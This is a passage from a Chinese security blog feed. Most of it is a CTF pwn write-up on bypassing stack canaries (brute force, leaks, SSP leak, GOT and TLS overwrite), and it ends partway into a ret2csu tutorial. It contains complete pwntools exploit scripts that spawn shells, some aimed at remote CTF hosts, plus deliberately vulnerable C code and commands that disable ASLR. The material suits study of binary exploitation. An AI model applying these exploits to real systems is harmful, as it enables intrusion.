rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>|&#x3D;</td><td>以…或</td><td>lexp |&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>，</td><td>逗号</td><td>rexp，rexp</td><td>rexp</td><td>L-R</td><td>是</td></tr></tbody></table><p>简单记就是:!&gt;算术运算符&gt;关系运算符符&gt;&amp;&amp;&gt;||&gt;赋值运算符</p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言,知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canary解决姿势</title>
      <link href="/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/"/>
      <url>/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<h2 id="Canary解决姿势"><a href="#Canary解决姿势" class="headerlink" title="Canary解决姿势"></a><strong>Canary解决姿势</strong></h2><p>被折磨的有点难受 找个时间来斩杀（bushi）又是被虐的一天~<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230627202644.jpg"></p><hr><p><u>有问题请指正~</u>❀<br><u>获取例题请在评论区留言或私信我</u>⭐</p><h4 id="一、canary爆破"><a href="#一、canary爆破" class="headerlink" title="一、canary爆破"></a><strong>一、canary爆破</strong></h4><p>标志提示就算fork函数吧 多线程开攻</p><p><strong>【funcannary】</strong>*</p><p>（1）先运行一下 peda配套checksec<br>                       <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002528552.png" alt="image-20230530002528552"><br>                       根据题目提示’have fun’和’welcome’在爆破的exp中会用作于覆盖节点</p><p>​                              ​<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002620435.png" alt="image-20230530002620435"> </p><p>​         发现Canary和PIE都开 准备好爆破（如果有可以利用的字符串canary也可以绕过）<br>​         对应随机化 后续在IDA中只能利用其地址计算偏移</p><p>（2）进IDA </p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002919532.png" alt="image-20230530002919532"></p><p>fork接口 &#x3D;&#x3D; canary爆破（多线程）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154247901.png" alt="image-20230530154247901"></p><p>发现函数入口为0x122D 并且发现”&#x2F;bin&#x2F;cat flag” 接下来找溢出位置爆破cannary</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154947024.png" alt="image-20230530154947024"></p><p>明显溢出 定位该函数sub_128A（爆破canary的位置）爆破成功后爆返回地址 （爆canary地址的下一位）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530155540402.png" alt="image-20230530155540402"></p><p>函数入口为0x122D shell返回地址为1329 偏移为0xfc(0x1329-0x122D) 覆盖的buf大小为0x68</p><p><strong>tips</strong><br>【1】canary大小为0x00-0xff 所以爆破时每字节需循环257次 又因为canary低三位定为\x00（32位爆破循环3次 64位循环7次）此处需循环7次<br>【2】程序入口点一般都是整数，即地址最低位为00，也就是这里的地址，0x29是可信的。就只要爆破后一位就OK，再后面的地址都相同，爆不爆都一样。</p><p>exp：</p><pre><code class="python">from pwn import *   context.arch = &#39;amd64&#39;context.os = &#39;linux&#39;context.log_level = &#39;debug&#39;p = process(&quot;./fun&quot;)#p = remote(&quot;39.106.65.236&quot;, &quot;30687&quot;)p.recvuntil(b&#39;welcome\n&#39;) canary = b&#39;\x00&#39;#canaryfor k in range(7):  info(f&#39;No:&#123;K+1&#125;start,finding...&#39;)  for i in range(256):     p.send(b&#39;a&#39;*(0x70-8)+cannary+btyes([i]))     recv = p.recvuntil(b&#39;welcome\n&#39;)     if b&quot;have fun&quot; in recv:      cannary += bytes([i])      success(f&quot;canary =&gt; &#123;canary.hex()&#125;&quot;)      break      #return addressre_1 = 0x29re_2 = 0info(&#39;finding:re_2 ...&#39;)for re_i in range(0x100):  payload = b&#39;a&#39; * 0x68 + canary + b&#39;A&#39; * 8 + p8(re_1) + p8(re_i)#p8()将给定的整数转换为单字节的字节串  p.send(payload)  recv = p.recvuntil(b&quot;welcome\n&quot;)  if b&quot;have fun&quot; in recv:       re_2 = re_i       success(f&quot;re_2 =&gt; &#123;hex(re_2)&#125;&quot;)       breakpayload = b&#39;a&#39; * (0x70-8) + canary + b&#39;A&#39; * 8 + p8(re_1 - 1) + p8(re_2 - 1)#-1对齐栈p.send(payload)p.interactive()</code></pre><h4 id="二、覆盖截断字符（-x00）获取canary"><a href="#二、覆盖截断字符（-x00）获取canary" class="headerlink" title="二、覆盖截断字符（\x00）获取canary"></a>二、覆盖截断字符（\x00）获取canary</h4><p>思路：<br>$构造第一次溢出，覆盖canary的低字节\x00，读出canary的值.<br>$构造第二次溢出，利用获取的canary构造payload，get shell.<br>【babypie】<br>（1）checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628164526442.png" alt="image-20230628164526442"></p><p>（2）IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628170950596.png" alt="image-20230628170950596"></p><p>  两次read溢出</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628171033720.png" alt="image-20230628171033720"></p><p>NX打开有可利用的system（”&#x2F;bin&#x2F;sh”）<br>PIE打开后低地址始终不变，可以碰运气（buhsi(●’◡’●)）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628172653111.png" alt="image-20230628172653111"></p><p>canary以\x00结尾（为防止被读出）那我们就溢出覆盖\x00再通过print函数打印出canary<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628173716094.png" alt="image-20230628173716094"></p><p>0x30-0x8 &#x3D; 40，再+1覆盖\x00<br>exp：</p><pre><code class="python">from pwn import*#sh = process(&#39;./babypie&#39;)sh = remote(&#39;node4.buuoj.cn&#39;,29536)payload = b&#39;a&#39; * 0x29#先整canarysh.sendafter(b&#39;Input your Name:\n&#39;,payload)sh.recv(6 + 40)#读取6个字节（即程序的回应消息）和40个字节（即程序返回的canary值）canary = u64(sh.recv(8)) &amp; (0xffffffffffffff00)#末尾清0以保持与程序内部的字节对齐log.success(&#39;canary:%x \n&#39;,canary)payload = b&#39;a&#39; * 40 + p64(canary)  + p64(0)+ b&#39;\x42&#39;#p64(0)将栈上的返回地址替换为0，从而绕过内存保护机制sh.send(payload)sh.interactive()</code></pre><h4 id="三、利用格式化字符串获取canary"><a href="#三、利用格式化字符串获取canary" class="headerlink" title="三、利用格式化字符串获取canary"></a><strong>三、利用格式化字符串获取canary</strong></h4><p>格式化字符串可以打印出栈中内容，目标利用此漏洞打印出canary值，再利用溢出进行攻击.<br>【Mary_Morton】<br>（1）checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628202654542.png" alt="image-20230628202654542"></p><p>（2）IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204047171.png" alt="image-20230628204047171"></p><p>快乐<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204121367.png" alt="image-20230628204121367"></p><p> 计算偏移喽<br>                                      <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204702697.png" alt="image-20230628204702697"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204720325.png" alt="image-20230628204720325"></p><p>buf与canary距离 0x90 - 0x8 &#x3D; 0x88(136)   2^8+1 &#x3D; 17个内存单元<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628210551449.png" alt="image-20230628210551449"></p><p>canary与printf格式化字符串形参相对偏移为17+6 &#x3D; 23<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628210759817.png" alt="image-20230628210759817"></p><p>exp：</p><pre><code class="python">from pwn import*context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) #p=process(&#39;./mary&#39;)p=remote(&quot;61.147.171.105&quot;,63174) p.sendlineafter(&quot;battle \n&quot;,&quot;2&quot;)p.sendline(&quot;%23$p&quot;)tmp=int(p.recv(),16)canary=p64(tmp) payload=b&quot;a&quot;*(0x88)+canary+p64(0)+p64(0x4008DA) p.sendlineafter(&quot;3.&quot;,&quot;1&quot;) p.sendline(payload)p.interactive()</code></pre><h4 id="四、SSP-Leak利用canary"><a href="#四、SSP-Leak利用canary" class="headerlink" title="四、SSP Leak利用canary"></a><strong>四、SSP Leak利用canary</strong></h4><p>思路：<br>$canary检测失败会触发stack_chk_fali函数造成stack smashing（stack smashing protect leak）<br>$stack_chk_fail函数会输出一段报错显示文件名，覆盖文件名指针，从而实现任意读也就是覆盖变量__libc_argv[0]<br>$利用相应函数进行溢出（puts、read、write）得到libcbase 得出关键地址进行攻击</p><pre><code class="c">void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123;  __fortify_fail (&quot;stack smashing detected&quot;);&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123;  /* The loop is added only to keep gcc happy.  */  while (1)    __libc_message (2, &quot;*** %s ***: %s terminatedn&quot;,                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);&#125;</code></pre><p>覆盖到argv就可输出我们想要的参数（即利用了canary的报错信息）</p><p>不同的libc对于__fortify_fail实现有差异，下面是glibc的实现<br><a href="https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/debug/fortify_fail.c">github源码：glibc&#x2F;debug&#x2F;fortify_fail.c</a><br>【2018网鼎杯 Guess】<br>(1)checsksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628135719174.png" alt="image-20230628135719174"></p><p>(2)IDA分析<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628142542077.png" alt="image-20230628142542077"></p><p>（3）利用stack samshing原理 gdb调试找到argv[0]计算偏移<br>通过覆盖libc_argv[0]的内容触发canary保护将覆盖内容进行输出<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628143124351.png" alt="image-20230628143124351"></p><p>在main函数位置下断点 rsi处为argv[0]地址(0x7fffffffdfc87)<br>libc中有一个变量environ，储存着栈地址 只要得到libc基址，就可以算出这个变量的地址，再次用__stack_chk_fail读取这个变量就可以得到栈的一个地址，就能计算出读进来的flag的地址，从而再次用stack smash读取flag</p><p>第一次，我们泄露函数的got表内容，得到glibc地址。得到glibc地址，是为了计算出stack_end变量的地址，进而，第二次，我们泄露栈地址，计算出flag存放的地址，于是，第三次，我们就可以泄露flag的值。</p><p>gets函数下断点  调试计算偏移0xfc8-0xea0（0x128）【还需进一步深入理解】</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628161126662.png" alt="image-20230628161126662"></p><p>exp：</p><pre><code class="python">from pwn import *from LibcSearcher import *context.log_level = &#39;debug&#39;elf = ELF(&#39;./GUESS&#39;)# libc = ELF(&#39;./libc-2.23.so&#39;)io = remote(&#39;node4.buuoj.cn&#39;,27922)# io = process(&#39;./GUESS&#39;)puts_got = elf.got[&#39;puts&#39;]def leak_addr(content):    io.recvline()    io.sendline(content)    io.recvuntil(&#39;*** stack smashing detected ***: &#39;)    addr = u64(io.recv(6).ljust(8,b&#39;\x00&#39;))    return addr# step1: leak puts_addrpayload1 = b&#39;a&#39;*0x128+p64(puts_got)puts_plt = leak_addr(payload1)print(&quot;puts_plt-----&gt;&quot; + hex(puts_plt))libc = LibcSearcher(&quot;puts&quot;,puts_plt)libc_base = puts_plt - libc.dump(&quot;puts&quot;)print(&quot;libc_base-----&gt;&quot; + hex(libc_base))environ = libc.dump(&#39;__environ&#39;) + libc_base# step2: leak environpayload2 = b&#39;a&#39;*0x128 + p64(environ)environ_addr = leak_addr(payload2)print(&quot;enviorn in stack-----&gt;&quot; + hex(environ_addr))# step3: leak flagpayload3 = b&#39;a&#39;*0x128 + p64(environ_addr-0x168)io.sendlineafter(&#39;Please type your guessing flag\n&#39;,payload3)print(io.recvline())</code></pre><h4 id="五、劫持stack-chk-fail函数泄露canary"><a href="#五、劫持stack-chk-fail函数泄露canary" class="headerlink" title="五、劫持stack_chk_fail函数泄露canary"></a>五、劫持stack_chk_fail函数泄露canary</h4><p>思路：劫持stack_chk_fail，可以修改全局偏移表(GOT)中存储的_stack_chk_fail函数地址，在触发canary检查失败时，跳转到指定的地址继续执行.</p><p>百度杯flagen其实可以做更好的栗子 目前暂未获取到相关文件 以后有机会填坑😊</p><p>有相关文章[(12条消息) [pwn]ROP：三道题讲解花式绕过Canary栈保护_breezeO_o的博客-CSDN博客](<a href="https://blog.csdn.net/Breeze_CAT/article/details/100086513?ops_request_misc=%7B%22request_id%22:%22168796009416800197015252%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168796009416800197015252&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-100086513-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=%E7%99%BE%E5%BA%A6%E6%9D%AF">https://blog.csdn.net/Breeze_CAT/article/details/100086513?ops_request_misc=%7B%22request%5Fid%22%3A%22168796009416800197015252%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=168796009416800197015252&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-100086513-null-null.142^v88^control_2,239^v2^insert_chatgpt&amp;utm_term=百度杯</a> flagen&amp;spm&#x3D;1018.2226.3001.4187)</p><p>自己整个小简单🤖<br><strong>漏洞代码</strong></p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;void shell(void)&#123;    system(&quot;/bin/sh&quot;);&#125;int main(int argc, char *argv[])&#123;    setbuf(stdin, NULL);    setbuf(stdout, NULL);    setbuf(stderr, NULL);    char buf[175];    read(0, buf, 275);#栈溢出    printf(buf);    return 0;&#125;</code></pre><p>要想成功劫持函数修改got表 需关闭relro<br>调用shell函数需要关闭pie</p><pre><code>gcc a.c -m32 -fstack-protector -no-pie -z noexecstack -z norelro -o a</code></pre><p>exp：</p><pre><code class="python">from pwn import *import timecontext(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)sh=process(&#39;a&#39;)offset=10scf_got=ELF(&#39;a&#39;).got[&#39;__stack_chk_fail&#39;]gs_addr=ELF(&#39;a&#39;).sym[&#39;getshell&#39;]exp=fmtstr_payload(offset, &#123;scf_got: gs_addr&#125;)sh.send(exp+&#39;A&#39;*100)sh.interactive()</code></pre><p>乐乐乐<br>找到文件了<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/%601%7D0$_NRN19IS]ZZA9EK_PE.jpg" alt="img"><br>【flagen】<br>got表覆写原理<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628224746293.png" alt="image-20230628224746293"><br>（1）checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628215919448.png" alt="image-20230628215919448"></p><p>（2）IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628220716478.png" alt="image-20230628220716478"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628220912579.png" alt="image-20230628220912579"></p><p>此部分会将输入部分变长（1个字节变成3个字节），其中dest为指向堆缓冲区的指针，在调用leetify()时，其值将被压入栈中，由于该函数存在栈溢出漏洞，攻击者可以利用这个漏洞覆盖掉dest的值为指定地址，在后续调用strcpy()时，实现向任意地址写的目的。<br>我们可以将dest覆盖为stack_chk_fail函数在got表中的地址，达到修改stack_chk_fail函数调用地址的目的，这样后续在调用该函数时，实际上执行的是攻击者的代码。又因为canary存在\x00截断，需寻找合适的函数进行输入.</p><p>还是通过泄露libcbase getshell</p><pre><code class="python">libc=LibcSearcher(&#39;alarm&#39;,alarm)system=alarm-libc.dump(&#39;alarm&#39;)+libc.dump(&#39;system&#39;)malloc_hook=alarm-libc.dump(&#39;alarm&#39;)+libc.dump(&#39;__malloc_hook&#39;)print(&#39;malloc_hook&#39;,hex(malloc_hook))p.sendline(&#39;/bin/sh\x00&#39;)p.sendline(p32(system))</code></pre><p>exp：</p><pre><code class="python">from pwn import *from LibcSearcher import *context.log_level=&#39;debug&#39;#context.terminal=[&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]elf=ELF(&#39;./flagen&#39;)def input(p,input):    p.sendlineafter(&#39;: &#39;,&#39;1&#39;)    p.sendline(input)def up(p):    p.sendlineafter(&#39;: &#39;,&#39;2&#39;)def low(p):    p.sendlineafter(&#39;: &#39;,&#39;3&#39;)def change(p):    p.sendlineafter(&#39;: &#39;,&#39;4&#39;)def addprefix(p):    p.sendlineafter(&#39;: &#39;,&#39;5&#39;)def prin(p):    p.sendlineafter(&#39;: &#39;,&#39;6&#39;)def exit(p):    p.sendlineafter(&#39;: &#39;,&#39;7&#39;)puts=0x08048510ret=0x0804846astack_check=0x0804B01Cpop_1=0x08048481pop_2=0x08048b00pop_3=0x08048d8dbss=0x804b144+0x8a=0x08048F60read=0x080486CBp=process(&#39;./flagen&#39;)payload=p32(ret)+b&#39;h&#39;*0x55+&#39;a&#39;*8+b&#39;a&#39;*5+p32(pop_1)+p32(stack_check)payload+=p32(puts)+p32(pop_1)+p32(elf.got[&#39;free&#39;])payload+=p32(read)+p32(pop_3)+p32(bss+0x100)+p32(0x6fffffff)+p32(0xffffffff)payload+=p32(read)+p32(pop_3)+p32(elf.got[&#39;free&#39;])+p32(0x6fffffff)+p32(0xffffffff)payload+=p32(elf.plt[&#39;free&#39;])+p32(pop_1)+p32(bss+0x100)input(p,payload)change(p)alarm=u32(p.recv()[4:8].ljust(4,&#39;\x00&#39;))libc=LibcSearcher(&#39;alarm&#39;,alarm)system=alarm-libc.dump(&#39;alarm&#39;)+libc.dump(&#39;system&#39;)malloc_hook=alarm-libc.dump(&#39;alarm&#39;)+libc.dump(&#39;__malloc_hook&#39;)print(&#39;malloc_hook&#39;,hex(malloc_hook))p.sendline(&#39;/bin/sh\x00&#39;)p.sendline(p32(system))p.interactive()p.close()</code></pre><h4 id="六、修改TSL绕过canary"><a href="#六、修改TSL绕过canary" class="headerlink" title="六、修改TSL绕过canary"></a>六、修改TSL绕过canary</h4><p>在linux下有一种线程局部存储（Tread Local Storage）机制，即TLS.<br>存储线程的一些全局变量.<br>结构：</p><pre><code class="c">typedef struct  &#123;    void *tcb;        /* Pointer to the TCB.  Not necessarily the                 thread descriptor used by libpthread.  */    dtv_t *dtv;    void *self;       /* Pointer to the thread descriptor.  */    int multiple_threads;    int gscope_flag;    uintptr_t sysinfo;    uintptr_t stack_guard;    uintptr_t pointer_guard;    ...  &#125; tcbhead_t;  </code></pre><p>注意：结构中uintptr_t stack_guard就是canary值，利用漏洞篡改stack_guard值即可绕过canary，而gs或fs寄存器指向此结构.</p><p>【bfnote】</p><p>（1）checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628102341433.png" alt="image-20230628102341433"></p><p>（2）进IDA<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628105142174.png" alt="image-20230628105142174"></p><p>漏洞：【1】s溢出0x600<br>           【2】v4进行初始化，检测限制了输入长度，而利用时并非利用了检测完成的值，利用了检测前的值，使得我们拥有一次在任意地址写入长度的能力<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628110303853.png" alt="image-20230628110303853"></p><p>gs寄存器指向的位置实际上就是内存中某处的tcbhead_t，而后面的0x14指的是stack_guard相对的偏移，那么tcbhead_t到底存储在哪，每个libc不同，但是对于pwn题经常使用的lib来说，其分布基本如图所示<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628111024934.png" alt="image-20230628111024934"></p><p>在libc地址更下位置和mmap一样同属共享映射区域，偏移相对固定.当我们malloc一个相当大的空间（此题&gt;&#x3D;0x20000），mallod就会用mmap来分配内存空间，其分配位置也会位于共享映射区域，依据mmap机制，其恰好处于tcbhead_r地址的低地址处，此时利用第二个漏洞写入可修改canary的值，从而实现绕过.<a href="https://blog.csdn.net/wmq880204/article/details/115163244?ops_request_misc=%7B%22request_id%22:%22168792272416800213048166%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168792272416800213048166&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-115163244-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=mmap=%E5%88%86%E9%85%8D%E6%9C%BA%E5%88%B6&spm=1018.2226.3001.4187">(12条消息) Linux系统mmap内存映射机制原理_seqiqi_菠萝-琪琪的博客-CSDN博客</a></p><p>（3）ret2dl-resolve机制利用（延迟绑定应用）<br>利用的两种结构<em>Sym（x86为Elf32_Sym x64为Elf64_Sym）</em>、<em>Rel（x86为Elf32_Rel x64为Elf64_Rel）</em></p><p>Sym基本结构</p><pre><code class="c">typedef struct&#123;  Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移（4字节）  Elf32_Addr    st_value;　　//(4字节)  Elf32_Word    st_size;　　//(4字节)  unsigned char st_info; //对于导入函数符号而言，它是0x12(1字节)  unsigned char st_other;　　//(1字节)  Elf32_Section st_shndx;　　// (2字节)&#125;Elf32_Sym; //对于导入函数符号而言，其他字段都是0</code></pre><pre><code class="c">struct Elf64_Sym&#123;  Elf64_Word    st_name;   //符号名，是相对.dynstr起始的偏移(4字节）  unsigned char st_info;   //对于导入函数符号而言，它是0x12(1字节)  unsigned char st_other;  //(1字节)  Elf64_Section st_shndx;  //(2字节）  Elf64_Addr    st_value;  //(8字节)  Elf64_Xword   st_size;   //(8字节)&#125;;//对于导入函数而言，其他字段都是0</code></pre><p>Rel基本结构</p><pre><code class="c">typedef struct &#123;    Elf32_Addr        r_offset;//是got的对应的地址(4字节)    Elf32_Word       r_info; //(4字节),其中最低字节应该为0x7，前三个字节当做一个数字，是相对.dynsym起始的偏移的下标(即偏移还需要除以0x10)&#125; Elf32_Rel;</code></pre><pre><code class="c">typedef struct &#123;    Elf64_Xword    r_offset;   //是got的对应的地址(8字节)    Elf64_Xword    r_info;     //(8字节),其中最低字节应该为0x7,前三个字节当做一个　　 Elf64_Sxword r_addend; 　　//(8字节) &#125; Elf64_Rel;</code></pre><p><u>一般x64选择gadget进行攻击 此题也为32位 故以下详细介绍32位使用ret2dl-resolve攻击方法</u><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628115713705.png" alt="image-20230628115713705"></p><p>32位延迟绑定具体流程<br>*第一个push的值实际上是对应的Rel和.dynrel的相对偏移<br> *jmp跳转到第一个第一个push偏移对应的Rel结构，取出里面的info中包含的sym结构的下标，找到对应的sym中的字符串的地址，从而解析到这个名称为该字符串的函数，将其地址写入rel第一项的地址中。此时，将栈清空到一开始push的两个值之前，从而正常执行对应的字符串的函数即可。</p><p>我们的ret2dl-resolve实际上设置为.got.plt<a href="%E4%B9%9F%E5%B0%B1%E6%98%AF%E5%9B%BE%E4%B8%AD%E7%9A%840x8048450">0</a>对应的地址即可，从而他解析完成后会继续按照给定的参数执行。<br><em>tip</em><br>中间的空白，作为gap，是因为执行的时候最后有栈地址的变化，若无gap作为阻隔，可能栈的变化会覆盖掉一些重要的数据，从而导致程序崩溃，所以需要留有一定的gap作为栈空间变化的gap</p><p>（4）漏洞利用<br>观察主函数发现一共进行了三次输入：<br>【1】修改canary、最终的返回地址及栈地址（可看汇编）<br>【2】伪造了一个shellcode<br>【3】使用TSL，绕过canary</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628134309027.png" alt="image-20230628134309027"></p><p>exp：</p><pre><code class="python">from pwn import *r = remote(&quot;node4.buuoj.cn&quot;, 25009)#r = process(&quot;./bfnote&quot;)elf = ELF(&quot;./bfnote&quot;)#libc = ELF(&#39;./lib/i386-linux-gnu/libc.so.6&#39;)bss_start = 0x0804A060gap = 0x500stack_overflow = b&#39;a&#39; * (0x3e - 0xc + 0x8) + p64(bss_start + gap + 0x4) r.recvuntil(&#39;Give your description : &#39;)r.send(stack_overflow)r.recvuntil(&#39;Give your postscript : &#39;)fake_sym = p32(bss_start + gap + 0x4 * 4 + 0x8 - 0x80482C8) + p32(0) + p32(0) + p32(0x12)fake_rel = p32(bss_start) + p32(0x7 + int((bss_start + gap + 0x4 * 4 + 0x8 + 0x8 + 0x8 - 0x080481D8) / 0x10) * 0x100)r.send(b&#39;\x00&#39; * gap + p32(0x08048450) + p32(bss_start + gap + 0x4 * 4 + 0x8 * 2 - 0x080483D0) + p32(0) + p32(bss_start + gap + 0x4 * 4) + b&#39;/bin/sh\x00&#39; + b&#39;system\x00\x00&#39; + fake_rel + fake_sym)r.recvuntil(&#39;Give your notebook size : &#39;)r.send(str(0x20000))r.recvuntil(&#39;Give your title size : &#39;)r.send(str(0xf7d22714 - 0xf7d01008 - 16))r.recvuntil(&#39;invalid ! please re-enter :\n&#39;)r.send(str(4))r.recvuntil(&#39;Give your title : &#39;)r.send(b&#39;a&#39;)r.recvuntil(&#39;Give your note : &#39;)r.send(b&#39;aaaa&#39;)r.interactive()</code></pre><p>难难难 啃啃啃<br>明天又是新的一天⭐<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230628215705.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn,知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2csu</title>
      <link href="/2023/09/01/ret2csu/"/>
      <url>/2023/09/01/ret2csu/</url>
      
        <content type="html"><![CDATA[<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用x64下__libc_csu_init函数中的gadgets.（64位传参机制导致，但我们不会每次都精准找到每个寄存器对应的gadgets）</p><p>此函数对libc进行初始化，而一般的程序都会调用libc函数，则此函数一定存在.</p><p><strong>什么是gadgets？</strong><br>gadgets是一段对寄存器进行操作的汇编指令，比如pop ebp；pop eax；每一条指令对应着一段地址将这些gadgets部署到栈中，__ sp指针指向某gadget时发现对应地址中是一条指令而不是一条数据后就会将该地址弹给 __ ip指针， __ip指针会执行该地址中存放的汇编指令，完成对寄存器的操作.（某一gadget-0x1a得到上一gadget） </p><h3 id="实例（蒸米ROP）"><a href="#实例（蒸米ROP）" class="headerlink" title="实例（蒸米ROP）"></a>实例（蒸米ROP）</h3><p>源码</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123;    char buf[128];    read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123;    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);    vulnerable_function();&#125;</code></pre><p>关闭栈保护并进行编译</p><pre><code>gcc -g -fno-stack-protector —z execstack -o test.c test</code></pre><p>关闭本机随机化（低配）</p><pre><code>#echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></pre><p>checksec看看<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230728162434881.png" alt="image-20230728162434881"></p><p>可以看到PIE还打开（但我们关闭了本机上的地址随机化可以当作PIEdisable）<br>相当于用</p><pre><code>gcc -fno-stack-protector -no-pie -o level test.c</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729002006111.png" alt="image-20230729002006111"></p><p>Go to IDA</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729152236817.png" alt="image-20230729152236817"></p><p>下面为gadget1，上面为gadget2.（不同版本gagget2不同，需要修改）</p><p>起始地址可以用0x4006AA，因为我们并不需要add，从pop需要寄存器开始就🆗.但是需要占位（解题思路中详细解释，请看以下分析）</p><p><strong>错位获取pop rsi；pop rdi</strong><br>若只是想单纯控制pop rsi和pop rdi寄存器，可以利用ROPgadget（pop r14和pop r15对应得gadget存在于libc_csu_init中）<br>机器码为<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729004219289.png" alt="image-20230729004219289"></p><p>具体search语法</p><pre><code>ROPgadget --binary level --opcode 5e#或者ROPgadget --binary level | grep &#39;pop rsi&#39;</code></pre><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>最终目的是执行system（‘&#x2F;bin&#x2F;sh’），NX保护开启，我们需要泄露libc函数地址(通过read&#x2F;write函数)，找到system函数写入‘&#x2F;bin&#x2F;sh’到bss段上，最后调用system函数.</p><p><strong>注意</strong><br>我们通常会把rbx的值设置成0，而rbp设置成1.这样的目的是在执行call qword ptr [r12+rbx*8]这个指令的时候，我们仅仅把r12的值给设置成指向我们想call地址的地址即可，从而不用管rbx。<br>又因为这三个指令add rbx,；cmp rbx, rbp；jnz short 